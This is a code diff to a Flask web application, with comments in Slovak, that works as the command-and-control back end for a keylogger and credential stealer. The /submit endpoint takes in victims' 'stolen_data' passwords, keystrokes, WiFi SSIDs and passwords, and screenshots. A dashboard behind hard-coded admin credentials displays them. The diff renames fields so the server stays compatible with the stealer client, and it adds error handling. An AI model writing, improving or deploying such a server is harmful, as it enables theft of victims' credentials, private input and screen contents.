@@ -28,42 +28,37 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# --- Upravený endpoint na prijímanie dát ---
 @app.route('/submit', methods=['POST'])
 def submit_data():
-    data = request.json
-    if not data:
-        return jsonify({"error": "No JSON data received"}), 400
+    try:
+        data = request.json
+        if not data:
+            return jsonify({"error": "No JSON data received"}), 400
 
-    # Pridáme čas prijatia
-    data['received_at'] = datetime.utcnow().isoformat() + "Z"
+        # Pridáme čas prijatia
+        data['received_at'] = datetime.utcnow().isoformat() + "Z"
 
-    # --- SPRACOVANIE NOVÝCH DÁT ---
-    # Táto časť zabezpečí, že údaje sú v štruktúre, ktorú vie dashboard zobraziť.
-    
-    # 1. Skontrolujeme, či existuje nové pole 'stolen_data'
-    if 'stolen_data' in data and isinstance(data['stolen_data'], list):
-        # Ak áno, predpokladáme, že je to nový formát skriptu.
-        # Dáta už sú v správnom formáte, nemusíme nič meniť.
-        pass # Nič nerobiť, 'data' je už v poriadku.
-    else:
-        # Ak pole 'stolen_data' neexistuje, je to buď starý formát,
-        # alebo sa nepodarilo získať žiadne poverenia.
-        # Pre konzistenciu vytvoríme prázdne pole, aby sa nerozbil dashboard.
-        data['stolen_data'] = []
+        # Kompatibilita s klientom - server očakáva 'stolen_data'
+        if 'passwords' in data:
+            data['stolen_data'] = data.pop('passwords')  # Premenovanie
+        elif 'stolen_data' not in data:
+            data['stolen_data'] = []
 
-    # 2. Zabezpečíme, aby existovali aj nové WiFi polia, aj keď sú prázdne
-    if 'wifi_ssid' not in data:
-        data['wifi_ssid'] = None
-    if 'wifi_password' not in data:
-        data['wifi_password'] = None
+        # WiFi kompatibilita
+        if 'ssid' in data:
+            data['wifi_ssid'] = data.pop('ssid')
 
-    # Uložíme spracované dáta
-    current_data = load_data()
-    current_data.append(data)
-    save_data(current_data)
-    
-    return jsonify({"status": "ok"}), 200
+        # Uložíme dáta
+        current_data = load_data()
+        current_data.append(data)
+        save_data(current_data)
+        
+        print(f"✅ Dáta prijaté od {data.get('user', 'Unknown')}: {len(data.get('keys', []))} klávesov, {len(data.get('stolen_data', []))} hesiel")
+        return jsonify({"status": "ok"}), 200
+        
+    except Exception as e:
+        print(f"❌ Server chyba: {e}")
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -71,7 +66,6 @@ def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        # Prihlasovacie údaje (u-Admin / 120202810428Jm!)
         if username == 'u-Admin' and password == '120202810428Jm!':
             session['logged_in'] = True
             return redirect(url_for('dashboard'))
@@ -88,9 +82,8 @@ def logout():
 @login_required
 def dashboard():
     data = load_data()
-    # Najnovšie dáta hore
     data = sorted(data, key=lambda x: x.get('received_at', ''), reverse=True)
-    return render_template('dashboard.html', data=data)
+    return render_template('admin.html', data=data)
 
 @app.route('/detail/<int:index>')
 @login_required
@@ -99,14 +92,14 @@ def detail(index):
     if index < 0 or index >= len(data):
         return "Not found", 404
     entry = data[index]
-    return render_template('dashboard_alt.html', entry=entry, index=index)
+    return render_template('detail.html', entry=entry, index=index)
 
 @app.route('/screenshot/<int:index>')
 @login_required
 def screenshot(index):
     data = load_data()
     if index < 0 or index >= len(data):
-        return "Not found", 404
+        return "No screenshot", 404
     entry = data[index]
     b64 = entry.get('screenshot')
     if not b64:
@@ -115,5 +108,4 @@ def screenshot(index):
     return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")
 
 if __name__ == '__main__':
-    # Na produkciu nastav debug=False a použij gunicorn
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
